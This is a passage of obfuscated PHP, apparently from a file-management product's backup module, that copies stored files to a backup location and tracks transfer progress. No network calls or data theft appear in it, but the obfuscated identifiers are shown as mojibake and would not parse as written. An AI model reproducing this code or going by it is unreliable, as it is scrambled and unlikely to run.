E‹‘Ç…ÒÍÛ; E‹‘Ç…ÒÍÛ: $E§ÌÇ¨âè¬ = CONTROLLER_DIR . $a¯¬³°ƒ¯Ä[791]; $D›—ªÌí»î = CONTROLLER_DIR . $a¯¬³°ƒ¯Ä[792]; IO::copy($E§ÌÇ¨âè¬, $F‡ÁÏß¤œ†); goto cÌù±›¢¤ó; a«Ó“ŠŠµ: $a¯¬³°ƒ¯Ä =& $_SERVER[ä°„ä°º]; $aáåèƒ£¿ = Backup::get(); $E×Üˆë‹ªÆ = $aáåèƒ£¿[$a¯¬³°ƒ¯Ä[28]]; goto bå¹–ğ¶…å; D²¿é†ŠŸ°: Backup::set($e©¬âÕ•¨¬); return !0; goto BÃºÄË¿†É; D¡ˆ“è—¡: if (!$cÙ–ë¾Ìå¿) { return !1; } $e©¬âÕ•¨¬ = array($a¯¬³°ƒ¯Ä[785] => $cÙ–ë¾Ìå¿, $a¯¬³°ƒ¯Ä[786] => time()); Backup::set($e©¬âÕ•¨¬); goto E•ÅÉ¡Öö¯; BÃºÄË¿†É: } private function backupPath($aÏÀ˜ÒÄô) { $cò¢İ ÖÎÔ =& $_SERVER[ä°„ä°º]; $EÊˆøÊ×ÀØ = $aÏÀ˜ÒÄô[$cò¢İ ÖÎÔ[28]]; $C“‰ëÏ›“ = Model($cò¢İ ÖÎÔ[753])->get($cò¢İ ÖÎÔ[754]); $eğø¦“İí = substr(md5($cò¢İ ÖÎÔ[755] . $C“‰ëÏ›“ . $EÊˆøÊ×ÀØ), 0, 8); return "\x7b\x69\x6f\72{$aÏÀ˜ÒÄô[$cò¢İ ÖÎÔ[735]]}\175\57\144\141\x74\141\142\141\163\145\57\142\141\143\153\165\160\57" . $EÊˆøÊ×ÀØ . $cò¢İ ÖÎÔ[71] . $eğø¦“İí; } private function tmpFilesPath() { $b“Á¾ˆÛ‘ğ =& $_SERVER[ä°„ä°º]; $Dàí•ò´ = TEMP_FILES; if ($GLOBALS[$b“Á¾ˆÛ‘ğ[6]][$b“Á¾ˆÛ‘ğ[88]][$b“Á¾ˆÛ‘ğ[783]]) { $Dàí•ò´ = $GLOBALS[$b“Á¾ˆÛ‘ğ[6]][$b“Á¾ˆÛ‘ğ[88]][$b“Á¾ˆÛ‘ğ[783]]; if (!mk_dir($Dàí•ò´) || !is_writable($Dàí•ò´) || !IO::mkfile($Dàí•ò´ . $b“Á¾ˆÛ‘ğ[784])) { $Dàí•ò´ = TEMP_FILES; } } return $Dàí•ò´; } } class BackupFile { public function __construct() { } public function index() { goto Fê¯ˆ¬®¸Ç; fİµ•–ìµ³: $F³•æõ—í„ = !0; $D¯“½Ó„‘‘ = $this->storeIds(); $aÀ‡‰ÒÛ…’ = 1; goto Eë¼Ü­”¢; c¹¯õ¦¹š: $c ñ†Û¦İØ = array($_SERVER[ä°„ä°º][811] => 1, $_SERVER[ä°„ä°º][476] => time(), $_SERVER[ä°„ä°º][758] => 1, $_SERVER[ä°„ä°º][808] => $dã¡Â¨õŒ», $_SERVER[ä°„ä°º][800] => $fâöØñ¦™Å, $_SERVER[ä°„ä°º][799] => $b×ÙÔÖØš, $_SERVER[ä°„ä°º][812] => time()); if ($d“Ì¦“ÅŠŸ) { $c ñ†Û¦İØ[$_SERVER[ä°„ä°º][809]] = $Eç¼êŠù¸¢; $c ñ†Û¦İØ[$_SERVER[ä°„ä°º][810]] = $E”»éŞ§‹; } Backup::set($c ñ†Û¦İØ); goto cÖã’•­§Š; Eë¼Ü­”¢: $Dğ™†¹¦Èˆ = 1000; $cÁçÊ£õç = $d“Ì¦“ÅŠŸ = 0; $D²Ù‰Ï© = array(); goto EÊ½Š¢§; EÊ½Š¢§: $E”»éŞ§‹ = $Eç¼êŠù¸¢ = 0; do { $d†¢÷‡›   = $_SERVER[ä°„ä°º][802]; $C‘ˆÎøè„Æ = Model($_SERVER[ä°„ä°º][770])->where($E Çì¿— ê)->field($d†¢÷‡›  )->order($_SERVER[ä°„ä°º][803])->selectPage($Dğ™†¹¦Èˆ, $aÀ‡‰ÒÛ…’); $F¥†ÓÄ•ñ† = !empty($C‘ˆÎøè„Æ[$_SERVER[ä°„ä°º][367]]) ? $C‘ˆÎøè„Æ[$_SERVER[ä°„ä°º][367]] : array(); foreach ($F¥†ÓÄ•ñ† as $aõÁ§…ğ±ë) { goto cÑà«©À¿¤; A—ªËÙÖ›ë: if ($cÁçÊ£õç >= 1024 * 1024 * 100) { $c ñ†Û¦İØ = array($_SERVER[ä°„ä°º][808] => $dã¡Â¨õŒ», $_SERVER[ä°„ä°º][809] => $Eç¼êŠù¸¢, $_SERVER[ä°„ä°º][810] => $E”»éŞ§‹); Backup::set($c ñ†Û¦İØ); $cÁçÊ£õç = $d“Ì¦“ÅŠŸ = 0; } goto EŞÊ¹ªËÈå; EÚËôöÀå‹: $cÁçÊ£õç += $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][78]]; $Eç¼êŠù¸¢ += 1; $E”»éŞ§‹ += $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][78]]; goto A—ªËÙÖ›ë; cÑà«©À¿¤: if (!$this->_fileExist($aõÁ§…ğ±ë, $D²Ù‰Ï©, $D¯“½Ó„‘‘)) { $b×ÙÔÖØš -= 1; $fâöØñ¦™Å -= (int) $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][78]]; write_log("\146\x69\x6c\145\40\156\157\164\40\x65\170\151\163\x74\56\146\x69\x6c\145\x49\x44\x3a{$aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][447]]}\54\x20\160\141\x74\x68\72{$aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][76]]}", $_SERVER[ä°„ä°º][804]); continue; } $bÇî…Éåİ³ = $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][76]]; $aˆÓÙÉé´µ = "\x7b\151\157\72{$B¯´ÅíÏÎ[$_SERVER[ä°„ä°º][735]]}\x7d" . substr($bÇî…Éåİ³, strlen("\x7b\x69\157\x3a{$aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][805]]}\x7d")); goto AÉ½¨§ìã; AÉ½¨§ìã: if (IO::exist($aˆÓÙÉé´µ)) { $D½½œÍ½¥ğ->updateFileEnd($aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][28]], $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][78]]); } else { $aˆÓÙÉé´µ = get_path_father($aˆÓÙÉé´µ); IO::mkdir($aˆÓÙÉé´µ); if (!IO::copy($bÇî…Éåİ³, $aˆÓÙÉé´µ, $_SERVER[ä°„ä°º][806])) { write_log($_SERVER[ä°„ä°º][807] . $bÇî…Éåİ³ . $_SERVER[ä°„ä°º][790] . $aˆÓÙÉé´µ . $_SERVER[ä°„ä°º][517], $_SERVER[ä°„ä°º][765]); $F³•æõ—í„ = !1; break; } } $dã¡Â¨õŒ» = $aõÁ§…ğ±ë[$_SERVER[ä°„ä°º][447]]; $d“Ì¦“ÅŠŸ += 1; goto EÚËôöÀå‹; EŞÊ¹ªËÈå: } $báñ‰¼ƒŒÎ = count($F¥†ÓÄ•ñ†); $aÀ‡‰ÒÛ…’++; } while ($báñ‰¼ƒŒÎ == $Dğ™†¹¦Èˆ); $D½½œÍ½¥ğ->end(); goto c¹¯õ¦¹š; aù¦ë‰¡£: $b×ÙÔÖØš = (int) Model($_SERVER[ä°„ä°º][770])->where($E Çì¿— ê)->count($_SERVER[ä°„ä°º][447]); $fâöØñ¦™Å = (int) Model($_SERVER[ä°„ä°º][770])->where($E Çì¿— ê)->sum($_SERVER[ä°„ä°º][78]); $D½½œÍ½¥ğ = new TaskFileTransfer($_SERVER[ä°„ä°º][797], $_SERVER[ä°„ä°º][765], $b×ÙÔÖØš, LNG($_SERVER[ä°„ä°º][766]) . $_SERVER[ä°„ä°º][767] . LNG($_SERVER[ä°„ä°º][798])); goto A¸£×§í‘°; A¸£×§í‘°: $D½½œÍ½¥ğ->task[$_SERVER[ä°„ä°º][746]] = $fâöØñ¦™Å; $c ñ†Û¦İØ = array($_SERVER[ä°„ä°º][799] => $b×ÙÔÖØš, $_SERVER[ä°„ä°º][800] => $fâöØñ¦™Å, $_SERVER[ä°„ä°º][801] => time()); Backup::set($c ñ†Û¦İØ); goto fİµ•–ìµ³; Fê¯ˆ¬®¸Ç: $B¯´ÅíÏÎ = Backup::get(); $dã¡Â¨õŒ» = $B¯´ÅíÏÎ[$_SERVER[ä°„ä°º][291]][$_SERVER[ä°„ä°º][193]][$_SERVER[ä°„ä°º][447]]; $E Çì¿— ê = array($_SERVER[ä°„ä°º][448] => array($_SERVER[ä°„ä°º][795], $dã¡Â¨õŒ»), $_SERVER[ä°„ä°º][796] => array($_SERVER[ä°„ä°º][329], $B¯´ÅíÏÎ[$_SERVER[ä°„ä°º][735]])); goto aù¦ë‰¡£; cÖã’•­§Š: $this->_fileFilter($D²Ù‰Ï©); return !0; goto AÆ¯Ò¦‹¡“; AÆ¯Ò¦‹¡“: } private function _fileExist($Aˆ¨Ÿù£ÕÁ, &$bÈÛ¬Æİã, $c²õãà¤³×) { goto F«Òõ’ß®¯; F«Òõ’ß®¯: $c‡öˆ‰ù =& $_SERVER[ä°„ä°º]; $AÀ çŸÕŸ = $Aˆ¨Ÿù£ÕÁ[$c‡öˆ‰ù[76]]; if (in_array($Aˆ¨Ÿù£ÕÁ[$c‡öˆ‰ù[447]], $bÈÛ¬Æİã)) { return !1; } goto fÇºÊ†­; fÇºÊ†­: if (!in_array($Aˆ¨Ÿù£ÕÁ[$c‡öˆ‰ù[805]], $c²õãà¤³×)) { return !1; } if (IO::exist($AÀ çŸÕŸ)) { return !0; } $c¢Ãß¤·åÓ = get_path_father($AÀ çŸÕŸ); goto fƒôä›Ø; d‚…ğ·øÆÑ: $bÈÛ¬Æİã = array_merge($bÈÛ¬Æİã, array_to_keyvalue($a´¦áÙ§Åë, $c‡öˆ‰ù[33], $c‡öˆ‰ù[447])); return !1; goto C³§Í†Î”¢; fƒôä›Ø: if (IO::exist($c¢Ãß¤·åÓ)) { $bÈÛ¬Æİã[] = $Aˆ¨Ÿù£ÕÁ[$c‡öˆ‰ù[447]]; return !1; } $b›‚½‘”İ = array($c‡öˆ‰ù[805] => $Aˆ¨Ÿù£ÕÁ[$c‡öˆ‰ù[805]], $c‡öˆ‰ù[76] => array($c‡öˆ‰ù[380], "{$c¢Ãß¤·åÓ}\45")); $a´¦áÙ§Åë = Model($c‡öˆ‰ù[770])->where($b›‚½‘”İ)->field($c‡öˆ‰ù[448])->select(); goto d‚…ğ·øÆÑ; C³§Í†Î”¢: } private function _fileFilter($B´ÔºÖŞœ´) { $c”ÉÆºÜÃ¥ =& $_SERVER[ä°„ä°º]; if (empty($B´ÔºÖŞœ´)) { return; } $d„“øŒË = array($c”ÉÆºÜÃ¥[447] => array($c”ÉÆºÜÃ¥[7], array_unique($B´ÔºÖŞœ´))); $fßñù£Ê = Model($c”ÉÆºÜÃ¥[813])->where($d„“øŒË)->field($c”ÉÆºÜÃ¥[395])->select(); foreach ($fßñù£Ê as $E†ÛµòÎ†) { Model($c”ÉÆºÜÃ¥[813])->remove($E†ÛµòÎ†[$c”ÉÆºÜÃ¥[395]], !1); } } private function storeIds() { $fôƒ†ó² =& $_SERVER[ä°„ä°º]; $b¿÷“Ì¨ò = Model($fôƒ†ó²[750])->listData(); $BÌ•˜³¶ßğ = array(); $Bå²Ş°ÎŞÊ = $GLOBALS[$fôƒ†ó²[6]][$fôƒ†ó²[88]][$fôƒ†ó²[814]]; foreach ($b¿÷“Ì¨ò as $AôÔ˜§åãß) { $B†›ª½£Ó× = strtolower($AôÔ˜§åãß[$fôƒ†ó²[94]]); if (!isset($Bå²Ş°ÎŞÊ[$B†›ª½£Ó×])) { continue; } $F„¬‚ÓºëÀ = $fôƒ†ó²[72] . (isset($Bå²Ş°ÎŞÊ[$B†›ª½£Ó×]) ? $Bå²Ş°ÎŞÊ[$B†›ª½£Ó×] : ucfirst($B†›ª½£Ó×)); if (!class_exists($F„¬‚ÓºëÀ)) { continue; } $BÌ•˜³¶ßğ[] = $AôÔ˜§åãß[$fôƒ†ó²[393]]; } return $BÌ•˜³¶ßğ; } } goto aÒ×ˆª„; D…†Ê²ò…: class TaskFileTransfer extends Task { protected function startAfter() { goto dÚ‹µ„Á­; aäíöÍîåô: Hook::bind($a­‰õ”Ì¦Ø[552], array($this, $a­‰õ”Ì¦Ø[1585])); Hook::bind($a­‰õ”Ì¦Ø[554], array($this, $a­‰õ”Ì¦Ø[1585])); Hook::bind($a­‰õ”Ì¦Ø[556], array($this, $a­‰õ”Ì¦Ø[1585])); goto EÕìôÄÀÀº; eªã¯´ë”¯: Hook::bind($a­‰õ”Ì¦Ø[1589], array($this, $a­‰õ”Ì¦Ø[1590])); Hook::bind($a­‰õ”Ì¦Ø[1591], array($this, $a­‰õ”Ì¦Ø[1592])); Hook::bind($a­‰õ”Ì¦Ø[1593], array($this, $a­‰õ”Ì¦Ø[1594])); goto EÕ½¸®„; F Ñ‡¹Á³À: Hook::bind($a­‰õ”Ì¦Ø[579], array($this, $a­‰õ”Ì¦Ø[1582])); Hook::bind($a­‰õ”Ì¦Ø[580], array($this, $a­‰õ”Ì¦Ø[1583])); Hook::bind($a­‰õ”Ì¦Ø[582], array($this, $a­‰õ”Ì¦Ø[1584])); goto c‡Œï·–ŠÁ; EÕ½¸®„: $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1595]] = LNG($a­‰õ”Ì¦Ø[1596]); $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1597]] = 0; $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1598]] = 0; goto bìº†·¢­¬; dÚ‹µ„Á­: $a­‰õ”Ì¦Ø =& $_SERVER[ä°„ä°º]; $E‘—‹ˆª•Ä =& $this->task; $this->sourceCopyFolder = !1; goto cÕ›”„¾ğ±; c‡Œï·–ŠÁ: Hook::bind($a­‰õ”Ì¦Ø[583], array($this, $a­‰õ”Ì¦Ø[1584])); Hook::bind($a­‰õ”Ì¦Ø[550], array($this, $a­‰õ”Ì¦Ø[1585])); Hook::bind($a­‰õ”Ì¦Ø[547], array($this, $a­‰õ”Ì¦Ø[1585])); goto aäíöÍîåô; EÕìôÄÀÀº: Hook::bind($a­‰õ”Ì¦Ø[1586], array($this, $a­‰õ”Ì¦Ø[1587])); Hook::bind($a­‰õ”Ì¦Ø[572], array($this, $a­‰õ”Ì¦Ø[1588])); $this->sourceModelCopyFlag = !1; goto eªã¯´ë”¯; bìº†·¢­¬: $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1044]] = $a­‰õ”Ì¦Ø[33]; $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1599]] = $a­‰õ”Ì¦Ø[33]; $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1600]] = 0; goto cõ‘º×Û‰§; cõ‘º×Û‰§: $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1601]] = 0; $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1602]] = 0; if (!$E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1454]]) { $E‘—‹ˆª•Ä[$a­‰õ”Ì¦Ø[1454]] = LNG($a­‰õ”Ì¦Ø[1603]); } goto B“˜å„¡¸¨; cÕ›”„¾ğ±: Hook::bind($a­‰õ”Ì¦Ø[1577], array($this, $a­‰õ”Ì¦Ø[1578])); Hook::bind($a­‰õ”Ì¦Ø[1131], array($this, $a­‰õ”Ì¦Ø[1579])); Hook::bind($a­‰õ”Ì¦Ø[1580], array($this, $a­‰õ”Ì¦Ø[1581])); goto F Ñ‡¹Á³À; B“˜å„¡¸¨: } protected function endAfter() { goto aÄ‡¡Ğ¸½; aÄ‡¡Ğ¸½: $f´Í‰îŠ› =& $_SERVER[ä°„ä°º]; Hook::unbind($f´Í‰îŠ›[1577], array($this, $f´Í‰îŠ›[1578])); Hook::unbind($f´Í‰îŠ›[1131], array($this, $f´Í‰îŠ›[1579])); goto CœÌø¼ÚãÍ; D›ïÆÄİ•³: Hook::unbind($f´Í‰îŠ›[547], array($this, $f´Í‰îŠ›[1585])); Hook::unbind($f´Í‰îŠ›[552], array($this, $f´Í‰îŠ›[1585])); Hook::unbind($f´Í‰îŠ›[554], array($this, $f´Í‰îŠ›[1585])); goto e¯¤¯ƒóÔ©; fÒ…ğùÖ•ğ: Hook::unbind($f´Í‰îŠ›[582], array($this, $f´Í‰îŠ›[1584])); Hook::unbind($f´Í‰îŠ›[583], array($this, $f´Í‰îŠ›[1584])); Hook::unbind($f´Í‰îŠ›[550], array($this, $f´Í‰îŠ›[1585])); goto D›ïÆÄİ•³; fÑ§Ó»­Õ: Hook::unbind($f´Í‰îŠ›[1589], array($this, $f´Í‰îŠ›[1590])); Hook::unbind($f´Í‰îŠ›[1591], array($this, $f´Í‰îŠ›[1592])); Hook::unbind($f´Í‰îŠ›[1593], array($this, $f´Í‰îŠ›[1594])); goto FôöŞ·¿´¦; e¯¤¯ƒóÔ©: Hook::unbind($f´Í‰îŠ›[556], array($this, $f´Í‰îŠ›[1585])); Hook::unbind($f´Í‰îŠ›[1586], array($this, $f´Í‰îŠ›[1587])); Hook::unbind($f´Í‰îŠ›[572], array($this, $f´Í‰îŠ›[1588])); goto fÑ§Ó»­Õ; CœÌø¼ÚãÍ: Hook::unbind($f´Í‰îŠ›[1580], array($this, $f´Í‰îŠ›[1581])); Hook::unbind($f´Í‰îŠ›[579], array($this, $f´Í‰îŠ›[1582])); Hook::unbind($f´Í‰îŠ›[580], array($this, $f´Í‰îŠ›[1583])); goto fÒ…ğùÖ•ğ; FôöŞ·¿´¦: } public function copyMoveStart($c®ñÇ–‚Í‰, $aÛ›‚–©”², $B´µÓ¯Ã•, $b‚‘†®¶Ú) { goto dÅÛôˆÃ¸Ë; EÛÜÙÜŒ¢·: if (substr($aÛ›‚–©”², 0, strlen($C¶Ìˆº»Û¦)) == $C¶Ìˆº»Û¦) { return; } if (substr($b‚‘†®¶Ú, 0, strlen($C¶Ìˆº»Û¦)) == $C¶Ìˆº»Û¦) { return; } $cÒáÚÔÅÙÆ =& $this->task; goto f´Ìµ·íÛ×; dÅÛôˆÃ¸Ë: $e»œÍÓà”’ =& $_SERVER[ä°„ä°º]; self::log($e»œÍÓà”’[1604] . $aÛ›‚–©”² . $e»œÍÓà”’[67] . $b‚‘†®¶Ú); $C¶Ìˆº»Û¦ = rtrim(TEMP_FILES, $e»œÍÓà”’[8]); goto EÛÜÙÜŒ¢·; f´Ìµ·íÛ×: $cÒáÚÔÅÙÆ[$e»œÍÓà”’[1605]] = KodIO::transferType($c®ñÇ–‚Í‰, $B´µÓ¯Ã•); $this->update(); goto A•ò´Èïè; A•ò´Èïè: } public function updateAfter() { $AÎß×¤Æ² =& $_SERVER[ä°„ä°º]; $d³Ğ‰÷‚É =& $this->task; if (!$d³Ğ‰÷‚É[$AÎß×¤Æ²[746]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($d³Ğ‰÷‚É[$AÎß×¤Æ²[1605]] == $AÎß×¤Æ²[1204]) { return; } self::updateTask($d³Ğ‰÷‚É); } private static function updateTask(&$D‡äèáÊÍ¸) { $CÅŸë ²Öè =& $_SERVER[ä°„ä°º]; if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1605]] == $CÅŸë ²Öè[1115] || $D‡äèáÊÍ¸[$CÅŸë ²Öè[1605]] == $CÅŸë ²Öè[107]) { if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1599]]) { $D‡äèáÊÍ¸[$CÅŸë ²Öè[1602]] = $D‡äèáÊÍ¸[$CÅŸë ²Öè[1601]] + $D‡äèáÊÍ¸[$CÅŸë ²Öè[1598]]; } } else { if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1605]] == $CÅŸë ²Öè[1205]) { if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1599]] == $CÅŸë ²Öè[1115]) { $D‡äèáÊÍ¸[$CÅŸë ²Öè[1602]] = $D‡äèáÊÍ¸[$CÅŸë ²Öè[1601]] + $D‡äèáÊÍ¸[$CÅŸë ²Öè[1598]] * 0.5; } else { if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1599]] == $CÅŸë ²Öè[107]) { $D‡äèáÊÍ¸[$CÅŸë ²Öè[1602]] = $D‡äèáÊÍ¸[$CÅŸë ²Öè[1601]] + $D‡äèáÊÍ¸[$CÅŸë ²Öè[1597]] * 0.5 + $D‡äèáÊÍ¸[$CÅŸë ²Öè[1598]] * 0.5; } } } } $D‡äèáÊÍ¸[$CÅŸë ²Öè[1552]] = $D‡äèáÊÍ¸[$CÅŸë ²Öè[1602]] / $D‡äèáÊÍ¸[$CÅŸë ²Öè[746]]; if ($D‡äèáÊÍ¸[$CÅŸë ²Öè[1552]] > 0) { $c‹¦é‡‹‚ = timeFloat() - $D‡äèáÊÍ¸[$CÅŸë ²Öè[772]] - $D‡äèáÊÍ¸[$CÅŸë ²Öè[1555]]; $D‡äèáÊÍ¸[$CÅŸë ²Öè[1556]] = $c‹¦é‡‹‚ * (1 - $D‡äèáÊÍ¸[$CÅŸë ²Öè[1552]]) / $D‡äèáÊÍ¸[$CÅŸë ²Öè[1552]]; } } public function addPath($dìš´Å¤ø×) { goto Aò£°Úñ«; C˜´††ƒŒ: if ($DÒ–ö•í½[$dÎšİ‡İ­[29]] == $dÎšİ‡İ­[193]) { $DöÂ…Î ¥¶[$dÎšİ‡İ­[1042]] += 1; } else { $DöÂ…Î ¥¶[$dÎšİ‡İ­[1042]] += $DÒ–ö•í½[$dÎšİ‡İ­[81]][$dÎšİ‡İ­[79]]; if ($DÒ–ö•í½[$dÎšİ‡İ­[395]]) { $DöÂ…Î ¥¶[$dÎšİ‡İ­[1042]] += $DÒ–ö•í½[$dÎšİ‡İ­[81]][$dÎšİ‡İ­[80]] + 1; } } $DöÂ…Î ¥¶[$dÎšİ‡İ­[746]] += $DÒ–ö•í½[$dÎšİ‡İ­[78]]; $this->update(); goto bî¢ŞÚåÂ; Aò£°Úñ«: $dÎšİ‡İ­ =& $_SERVER[ä°„ä°º]; if (!$dìš´Å¤ø×) { return; } $DöÂ…Î ¥¶ =& $this->task; goto C´á¬…¯à; C´á¬…¯à: $DÒ–ö•í½ = IO::infoWithChildren($dìš´Å¤ø×); $f‡ø¼ê¶ë = $DöÂ…Î ¥¶[$dÎšİ‡İ­[1606]] ? $DöÂ…Î ¥¶[$dÎšİ‡İ­[1606]][$dÎšİ‡İ­[1607]] : 0; $DöÂ…Î ¥¶[$dÎšİ‡İ­[1606]] = array($dÎšİ‡İ­[1607] => $f‡ø¼ê¶ë + 1, $dÎšİ‡İ­[413] => $DÒ–ö•í½[$dÎšİ‡İ­[28]], $dÎšİ‡İ­[76] => $DÒ–ö•í½[$dÎšİ‡İ­[76]], $dÎšİ‡İ­[500] => $DÒ–ö•í½[$dÎšİ‡İ­[500]] ? $DÒ–ö•í½[$dÎšİ‡İ­[500]] : $DÒ–ö•í½[$dÎšİ‡İ­[76]]); goto C˜´††ƒŒ; bî¢ŞÚåÂ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Aê¸«êŒÀ¥) { $d­òŞíŸÖƒ =& $_SERVER[ä°„ä°º]; $Bó¤µœ•Á‚ =& $this->task; $Bó¤µœ•Á‚[$d­òŞíŸÖƒ[1595]] = $Aê¸«êŒÀ¥[$d­òŞíŸÖƒ[28]]; $Bó¤µœ•Á‚[$d­òŞíŸÖƒ[1044]] = $Aê¸«êŒÀ¥[$d­òŞíŸÖƒ[28]]; $this->update(); } public function copyFileStart($b—š¯İÏ, $cĞ®‚¥‰¦Õ, $d—ôğ÷±îñ, $dŒòÊĞ¸¢¬, $e—¼¨ÈÑÌ„, $Bİõô¢¯Î) { goto C´ÎÔäëŒ; d¸ÜÃ…‹Ù: $this->update(0, $C¬£¡‘›); goto EÙ•ãßŒ–; eš÷Ö‚ï®Ó: $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1595]] = $Aàéòµ„ò; $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1597]] = (int) $b—š¯İÏ->size($cĞ®‚¥‰¦Õ); $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1598]] = 0; goto d˜íèã¬‘; C´ÎÔäëŒ: $aˆó”ºñ‘“ =& $_SERVER[ä°„ä°º]; $Aàéòµ„ò = $e—¼¨ÈÑÌ„; if ($Aàéòµ„ò == $GLOBALS[$aˆó”ºñ‘“[1608]]) { $Aàéòµ„ò = $GLOBALS[$aˆó”ºñ‘“[1609]]; } goto e¾»õ˜õéò; eÅÆğ¶Ê: $C¬£¡‘› = $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1597]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($d‹Ã›£Ö®é[$aˆó”ºñ‘“[393]] . $aˆó”ºñ‘“[1610]); if ($C¬£¡‘› && file_exists(get_path_father($dŒòÊĞ¸¢¬))) { Cache::set($d‹Ã›£Ö®é[$aˆó”ºñ‘“[393]] . $aˆó”ºñ‘“[1610], $dŒòÊĞ¸¢¬); $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1570]] = array($aˆó”ºñ‘“[1611], $aˆó”ºñ‘“[1612]); } goto d¸ÜÃ…‹Ù; d˜íèã¬‘: $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1044]] = $aˆó”ºñ‘“[33]; $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1599]] = $aˆó”ºñ‘“[33]; $d‹Ã›£Ö®é[$aˆó”ºñ‘“[1600]] = 0; goto eÅÆğ¶Ê; e¾»õ˜õéò: $GLOBALS[$aˆó”ºñ‘“[1609]] = $e—¼¨ÈÑÌ„; $GLOBALS[$aˆó”ºñ‘“[1608]] = $Bİõô¢¯Î; $d‹Ã›£Ö®é =& $this->task; goto eš÷Ö‚ï®Ó; EÙ•ãßŒ–: } public static function updateCopyLocalFileSize($C¶Ùª°øí‰) { goto B©õ½ï–’À; F’”Ì‹¿‘: $C¶Ùª°øí‰[$FíŞôÖ™[1598]] = @filesize($E²ì®Åİ½°); $C¶Ùª°øí‰[$FíŞôÖ™[1602]] += $C¶Ùª°øí‰[$FíŞôÖ™[1598]]; self::updateTask($C¶Ùª°øí‰); goto A‰µ‰‰ƒ‡; B©õ½ï–’À: $FíŞôÖ™ =& $_SERVER[ä°„ä°º]; $E²ì®Åİ½° = Cache::get($C¶Ùª°øí‰[$FíŞôÖ™[393]] . $FíŞôÖ™[1610]); if (!$E²ì®Åİ½° || !file_exists($E²ì®Åİ½°)) { return $C¶Ùª°øí‰; } goto F’”Ì‹¿‘; A‰µ‰‰ƒ‡: return $C¶Ùª°øí‰; goto b‘¾ÜÜÏ ; b‘¾ÜÜÏ : } public function copyFileEnd($B‡ÌŸ¢®ï…, $a¦éÁ¡İ¡¹, $CªÚÂäõ¼, $e¬èäµ¤÷ƒ, $B«ÆËåÏç‰, $CÖ£Ó‚Çø) { goto dãõ´Á´–÷; dãõ´Á´–÷: $eÇÑÛÊ½öÔ =& $_SERVER[ä°„ä°º]; $E½“§‡ò×¦ =& $this->task; $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1598]] = $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1597]]; goto C”Ï÷Ó‚“´; bïèãš”¨: Cache::remove($E½“§‡ò×¦[$eÇÑÛÊ½öÔ[393]] . $eÇÑÛÊ½öÔ[1610]); self::log($eÇÑÛÊ½öÔ[1613] . $a¦éÁ¡İ¡¹ . $eÇÑÛÊ½öÔ[67] . $e¬èäµ¤÷ƒ . $eÇÑÛÊ½öÔ[229] . $B«ÆËåÏç‰ . $eÇÑÛÊ½öÔ[1614] . $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1595]]); goto b¾¿ˆ¬èÇŠ; C”Ï÷Ó‚“´: $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1599]] = $eÇÑÛÊ½öÔ[33]; unset($E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1570]]); if ($B«ÆËåÏç‰ == $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1595]]) { $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1601]] += $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1597]]; $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1602]] = $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1601]]; $this->update(1); } else { $this->update(); $E½“§‡ò×¦[$eÇÑÛÊ½öÔ[1598]] = 0; } goto bïèãš”¨; b¾¿ˆ¬èÇŠ: } public function updateFileEnd($DöÀé¹Ÿë“, $c×Ãó¤¬øŞ) { goto C÷¦ã„àéÕ; eñ©ãÜƒœ—: $b¤ÕÜò²¸Í[$b‘ğ¿Š†Ù[1597]] = $c×Ãó¤¬øŞ; $b¤ÕÜò²¸Í[$b‘ğ¿Š†Ù[1601]] += $c×Ãó¤¬øŞ; $b¤ÕÜò²¸Í[$b‘ğ¿Š†Ù[1602]] = $b¤ÕÜò²¸Í[$b‘ğ¿Š†Ù[1601]]; goto c¹ÃÌÖµôĞ; C÷¦ã„àéÕ: $b‘ğ¿Š†Ù =& $_SERVER[ä°„ä°º]; $b¤ÕÜò²¸Í =& $this->task; $b¤ÕÜò²¸Í[$b‘ğ¿Š†Ù[1595]] = $DöÀé¹Ÿë“; goto eñ©ãÜƒœ—; c¹ÃÌÖµôĞ: $this->update(1); self::log($b‘ğ¿Š†Ù[1615] . $DöÀé¹Ÿë“); goto F Ã‰Ç˜™ì; F Ã‰Ç˜™ì: } public function 